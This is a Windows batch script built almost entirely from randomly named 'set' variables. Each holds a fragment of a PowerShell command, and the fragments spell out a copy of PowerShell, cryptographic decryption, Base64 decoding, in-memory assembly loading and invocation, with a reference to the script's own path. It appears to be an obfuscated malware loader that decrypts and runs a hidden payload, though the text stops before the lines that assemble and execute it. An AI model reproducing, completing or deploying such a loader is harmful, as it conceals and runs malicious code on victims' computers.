@echo off
set "tsEMOosVth=y "
set "RNAtgdNXcu=do"
set "WkmClJxtSc= /"
set "mIZJmbfBnp=nd"
set "lVpnDRFYxt=ws"
set "zffZQhILnf=py"
set "RTzxywDkfz=ow"
set "fTJSomRvXS= C"
set "WzlMGydSJR=Sy"
set "lERDDaSflh=0\"
set "LhcetrINRZ=32"
set "GmzzqdAkfW=ll"
set "rrFCVZJADE=he"
set "qdYJiOtCqe=.e"
set "eiveiGkhhj=we"
set "NiDLtgqrkl=Wi"
set "nsEClrUwYO=rS"
set "kpcYjQuFqD=he"
set "hcCVTqqpKD=:\"
set "tKAnnbqGWx=\W"
set "VOtBBJoxpF=co"
set "YcpOKcGnJe=rs"
set "CfmKuTHpsq=em"
set "IaCJsOfxVr=1."
set "QJqbgNyPSZ=po"
set "hlfNIdYuIW=xe"
set "njKBGQnArM=in"
set "uDWEVFKPgB=we"
set "CasUdCxAyC=Po"
set "QsbJrWqXyi=s\"
set "lPcvMUJgnW=st"
set "qpFVWIInIX=ll"
set "HxQnfkwQJL=\v"
set "UKUEZNJqWO= %~dp0"
set "ncunfdrrYL=cd"
set "fMxhsMeXlW=.Cry"
set "VXfrObzEjn=[-1."
set "DIOnoannxF= '')"
set "HPJxAGPlAU=;$Ij"
set "dAvngCDBnP=.Cre"
set "GRTNmtjFXj=)))"
set "baMMxrNAzP=NaLA"
set "wyxSHvTFzb=bjec"
set "tptwrYCcPu=pose"
set "MjEsouAGbN=-joi"
set "GDPmwJhhdj=Conv"
set "VdkggnXiBI=esFX"
set "eEctsBubtn=yste"
set "YvbnQjPuly=nage"
set "RZCejnJdMf=, $S"
set "hDrINWbeAZ=h = "
set "KDdQVGEiKO=ing("
set "iEimmIXIAA=gth)"
set "kumCflsXFJ=mory"
set "eXSRoHGhdj=ach "
set "jQEDOYdIPn=saBm"
set "ohAFtXznNX=($Nw"
set "BHjxcUiJWF=onve"
set "RVXOjsNZTq=ecry"
set "GqzvhhTxtJ=sGUc"
set "FZxnqGeNtc=pher"
set "GCuSNWdMON=F'[-"
set "UpjLLPtuwd=cj ="
set "UtEwRyNLsQ='[-1"
set "BKAukRaWRA= = $"
set "yyyBqLgHlm='')("
set "hZWHQbACys='dqR"
set "QRsEhYHMyL=n ''"
set "jfJDGCuikO==');"
set "tuBXrhXUlP=h, 0"
set "ITbqeOfstC=Invo"
set "aqktuqSVua=ose("
set "iUPJPdCjPA=.Key"
set "qJwGfdUSwv=and "
set "ODHXyBPsVy=h = "
set "loEtkcUvMC=LNaL"
set "DjoyLJvQBD=comm"
set "gMZKvqylFq===')"
set "SWeIitMIOz=em.C"
set "LPQjDgpvcF=NaLA"
set "nuIsMdfouU=v4Ir"
set "fkouiVxMsD=esMa"
set "gQFraniERT=$SzX"
set "DIbkwwgNQS=.Ass"
set "vVPqCDteYX=d;$L"
set "AJnPqKXVBs=O.Me"
set "jZdBNrthdm=esaB"
set "wyajghTXWp=oryS"
set "HiHPBabejw=yste"
set "gaulehgxvb=tem."
set "mqoinKAUqL=  $S"
set "wAhlqhqBAl='txe"
set "KDWYjezOki=('%~f0'"
set "KxmNOBZbQT=KOdh"
set "DKSublqPpI=ay()"
set "oaEvcSCZGE=rat "
set "upjIijbEwU=::('"
set "sNMhONFHQr=).Sp"
set "GqNtDqaezz=y.Ci"
set "vIkEotawYc=t Sy"
set "kwfaJSSQxt=tryP"
set "oEoWTysnCg=ress"
set "SgzoNurQPP=lm);"
set "WFyPjIgIhs= if "
set "iWggQjJesb=isfL"
set "gBOozZhfLV=ypto"
set "WVyPJeBUIU=6esa"
set "tSLRAFpUXv=yste"
set "KyXVgsAEDk=rity"
set "DPOzDfAqjo=$Boq"
set "JmsqzHtTnl=stem"
set "QhJhvoyTmY== [S"
set "GHzoSEWNTp=lBlo"
set "cwPHkSmCEg=);$f"
set "jwXvOzyHYr=A.Pa"
set "FTMmmkbCBi=.Con"
set "LejDVzFzIe= = $"
set "WtxBBqaFvQ=;$Uu"
set "XcYtmxxAZF=oArr"
set "YHqyLPcGSH=..-1"
set "ZHZuuETtOj=16] "
set "cFJkAvPrvu=1..-"
set "VYSClTMWho=0O+g"
set "GEpqcVEUjs=736u"
